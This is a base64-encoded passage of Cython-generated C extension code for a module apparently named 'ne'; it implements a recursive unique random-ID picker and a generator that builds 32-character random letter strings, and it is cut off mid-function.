ZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCogdmFsdWVzWzJdID0gezAsMH07CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicmFuZF9pZHMgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmJrLCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSWRvLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDM4OCwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAyOgogICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAzODgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzODgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJyYW5kX2lkcyIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzg4LCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgicmFuZF9pZHMiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDM4OCwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAyKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzODgsIF9fcHl4X0wzX2Vycm9yKQogICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDM4OCwgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X2JiayA9IHZhbHVlc1swXTsKICAgIF9fcHl4X3ZfSWRvID0gdmFsdWVzWzFdOwogIH0KICBnb3RvIF9fcHl4X0w2X3NraXA7CiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6OwogIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJyYW5kX2lkcyIsIDEsIDIsIDIsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDM4OCwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLnJhbmRfaWRzIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIE5VTEw7CiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6OwogIF9fcHl4X3IgPSBfX3B5eF9wZl8ybmVfMTZyYW5kX2lkcyhfX3B5eF9zZWxmLCBfX3B5eF92X2JiaywgX19weXhfdl9JZG8pOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV8xNnJhbmRfaWRzKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2JiaywgUHlPYmplY3QgKl9fcHl4X3ZfSWRvKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfSWQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzU7CiAgaW50IF9fcHl4X3RfNjsKICBpbnQgX19weXhfdF83OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJhbmRfaWRzIiwgMCk7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzODksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzg5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzUgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHsKICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNCk7CiAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNSA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzIsIF9fcHl4X3ZfYmJrLCBfX3B5eF92X0lkb307CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDMtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICB9CiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzODksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIF9fcHl4X3ZfSWQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogIF9fcHl4X3RfNCA9IDA7CgogIAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaWRzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzkwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX3B5eF90XzYgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X3ZfSWQsIF9fcHl4X3RfNCwgUHlfTkUpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzYgPCAwKSkpIF9fUFlYX0VSUigwLCAzOTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIGlmIChfX3B5eF90XzYpIHsKCiAgICAKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaWRzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzkxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfQXBwZW5kKF9fcHl4X3RfNCwgX19weXhfdl9JZCk7IGlmICh1bmxpa2VseShfX3B5eF90XzcgPT0gKChpbnQpLTEpKSkgX19QWVhfRVJSKDAsIDM5MSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKCiAgICAKICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdl9JZCk7CiAgICBfX3B5eF9yID0gX19weXhfdl9JZDsKICAgIGdvdG8gX19weXhfTDA7CgogICAgCiAgfQoKICAKICAgewogICAgX19weXhfdF8xID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZF9pZHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzOTQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX3B5eF90XzUgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMikpKSB7CiAgICAgIF9fcHl4X3RfMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMik7CiAgICAgIGFzc2VydChfX3B5eF90XzEpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzIsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMSwgX19weXhfdl9iYmssIF9fcHl4X3ZfSWRvfTsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzOTQsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIH0KCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygibmUucmFuZF9pZHMiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X0lkKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ybmVfMTl1dXUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCk7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ybmVfMTl1dXUgPSB7InV1dSIsIChQeUNGdW5jdGlvbilfX3B5eF9wd18ybmVfMTl1dXUsIE1FVEhfTk9BUkdTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ybmVfMTl1dXUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCkgewogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgidXV1ICh3cmFwcGVyKSIsIDApOwogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgX19weXhfciA9IF9fcHl4X3BmXzJuZV8xOHV1dShfX3B5eF9zZWxmKTsKCiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ybmVfM3V1dV8yZ2VuZXJhdG9yMyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5lXzN1dXVfZ2VuZXhwcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7CiAgc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpOwogIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkgewogICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICopUHlfTm9uZSk7CiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgICBfX1BZWF9FUlIoMCwgNDA5LCBfX3B5eF9MMV9lcnJvcikKICB9IGVsc2UgewogICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgfQogIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMm5lXzN1dXVfMmdlbmVyYXRvcjMsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXV1X2xvY2Fsc19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmUpOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7CiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuOwogIH0KCiAgCiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X0FkZFRyYWNlYmFjaygibmUudXV1LmdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ybmVfM3V1dV8yZ2VuZXJhdG9yMyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSAKewogIHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKV9fcHl4X2dlbmVyYXRvci0+Y2xvc3VyZSk7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIGxvbmcgX19weXhfdF8xOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzY7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkgewogICAgY2FzZSAwOiBnb3RvIF9fcHl4X0wzX2ZpcnN0X3J1bjsKICAgIGRlZmF1bHQ6IAogICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgICByZXR1cm4gTlVMTDsKICB9CiAgX19weXhfTDNfZmlyc3RfcnVuOjsKICBpZiAodW5saWtlbHkoIV9fcHl4X3NlbnRfdmFsdWUpKSBfX1BZWF9FUlIoMCwgNDA5LCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDQwOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3IpOwoKICAKICBmb3IgKF9fcHl4X3RfMSA9IDA7IF9fcHl4X3RfMSA8IDMyOyBfX3B5eF90XzErPTEpIHsKICAgIF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9fID0gX19weXhfdF8xOwoKICAgIAogICAgX19weXhfdF8zID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDA5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaG9pY2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fcHl4X3RfNiA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfMyk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF82ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym5BWkVSVFl9OwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQwOSwgX19weXhfTDFfZX